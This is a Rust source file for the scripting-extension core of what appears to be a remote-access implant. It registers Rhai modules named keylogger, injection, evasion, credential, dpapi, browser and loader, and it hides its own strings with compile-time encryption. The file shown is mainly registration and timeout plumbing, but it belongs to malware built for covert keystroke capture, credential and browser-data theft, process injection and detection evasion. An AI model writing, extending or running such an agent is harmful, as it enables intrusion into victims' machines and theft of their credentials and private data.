// src/agent/scripting/mod.rs
//
// Entry point for the Rhai extension engine.
// Each sub-module owns a focused slice of the API surface and exposes one
// `register(engine)` call. Adding a new capability = new file + one line here.

mod win_ffi;
mod helpers;

// ── Original modules ───────────────────────────────────────────────────────
mod fs;
mod system;
mod network;
mod crypto;
mod media;
mod process;
mod memory;
mod dpapi;
mod browser;
mod search;
mod keylogger;
mod injection;
mod artifacts;
mod pipes;

// ── Round 2 additions ──────────────────────────────────────────────────────
mod io;
mod compress;
mod dns;
mod sysinfo;
mod evasion;
mod procinfo;
mod state;
mod loader;
mod credential;
mod registry;
mod winext;
mod python;

// Re-export for agent/mod.rs file browser.
pub use helpers::get_directory_json;

use rhai::{Engine, Scope, Dynamic};
use std::sync::{Arc, Mutex};
use std::collections::HashMap;
use crate::strcrypt_rt;
use strcrypt::aes_str;

/// Agent-side Rhai limits. The engine runs under a global mutex on a
/// blocking thread; without limits one infinite loop or runaway string
/// wedges every extension on the agent. The per-script wall-clock budget
/// is enforced through on_progress (the only way to abort an eval).
const MAX_SCRIPT_OPS: u64 = 5_000_000;
const MAX_SCRIPT_CALL_DEPTH: usize = 64;
const MAX_SCRIPT_STRING: usize = 16 * 1024 * 1024;
const SCRIPT_TIMEOUT: std::time::Duration = std::time::Duration::from_secs(300);

pub struct ExtensionManager {
    engine: Engine,
    scope:  Scope<'static>,
    // Shared KV store - all state::register closures hold an Arc clone.
    state:  Arc<Mutex<HashMap<String, String>>>,
    // Per-script wall-clock deadline consumed by the on_progress handler.
    deadline: Arc<Mutex<Option<std::time::Instant>>>,
}

impl ExtensionManager {
    pub fn new() -> Self {
        let mut engine = Engine::new();
        let state: Arc<Mutex<HashMap<String, String>>> =
            Arc::new(Mutex::new(HashMap::new()));

        // Resource limits: a runaway script fails with a script error
        // instead of taking the whole extension subsystem with it.
        engine.set_max_operations(MAX_SCRIPT_OPS);
        engine.set_max_call_levels(MAX_SCRIPT_CALL_DEPTH);
        engine.set_max_string_size(MAX_SCRIPT_STRING);

        let deadline: Arc<Mutex<Option<std::time::Instant>>> = Arc::new(Mutex::new(None));
        engine.on_progress({
            let deadline = deadline.clone();
            move |_ops| {
                let expired = deadline.lock()
                    .map(|d| d.map(|t| std::time::Instant::now() > t).unwrap_or(false))
                    .unwrap_or(false);
                // Returning Some aborts evaluation with ErrorTerminated.
                if expired { Some(Dynamic::UNIT) } else { None }
            }
        });

        // ── Original ──────────────────────────────────────────────────────
        fs::register(&mut engine);
        system::register(&mut engine);
        network::register(&mut engine);
        crypto::register(&mut engine);
        media::register(&mut engine);
        process::register(&mut engine);
        memory::register(&mut engine);
        dpapi::register(&mut engine);
        browser::register(&mut engine);
        search::register(&mut engine);
        keylogger::register(&mut engine);
        injection::register(&mut engine);
        artifacts::register(&mut engine);
        pipes::register(&mut engine);

        // ── Round 2 ───────────────────────────────────────────────────────
        io::register(&mut engine);
        compress::register(&mut engine);
        dns::register(&mut engine);
        sysinfo::register(&mut engine);
        evasion::register(&mut engine);
        procinfo::register(&mut engine);
        state::register(&mut engine, state.clone());
        loader::register(&mut engine);
        credential::register(&mut engine);
        registry::register(&mut engine);
        winext::register(&mut engine);

        // crypto and network round-2 extensions live in their own pub fn
        // to avoid a single 400-line file; call them here.
        crypto::register_crypto_ext(&mut engine);
        network::register_network_ext(&mut engine);

        python::register(&mut engine);

        Self { engine, scope: Scope::new(), state, deadline }
    }

    pub fn run_script(&mut self, script_content: &str, args: Vec<String>) -> String {
        let rhai_args: Vec<Dynamic> = args.into_iter().map(|s| s.into()).collect();
        self.scope.set_or_push(&*aes_str!("args"), rhai_args);

        *self.deadline.lock().unwrap_or_else(|e| e.into_inner()) =
            Some(std::time::Instant::now() + SCRIPT_TIMEOUT);
        let result = self.engine.eval_with_scope::<String>(&mut self.scope, script_content);
        *self.deadline.lock().unwrap_or_else(|e| e.into_inner()) = None;

        match result {
            Ok(result) => result,
            Err(e) => {
                let budget_hit = matches!(*e,
                    rhai::EvalAltResult::ErrorTerminated(_, _)
                    | rhai::EvalAltResult::ErrorTooManyOperations(_));
                if budget_hit {
                    // Wall-clock deadline or operation budget; either way
                    // the subsystem stays live for the next script.
                    format!("{}execution budget exceeded (timeout {}s or {} ops)",
                        aes_str!("[Script Aborted]: "), SCRIPT_TIMEOUT.as_secs(), MAX_SCRIPT_OPS)
                } else {
                    format!("{}{}", aes_str!("[Script Exception]: "), e)
                }
            }
        }
    }
}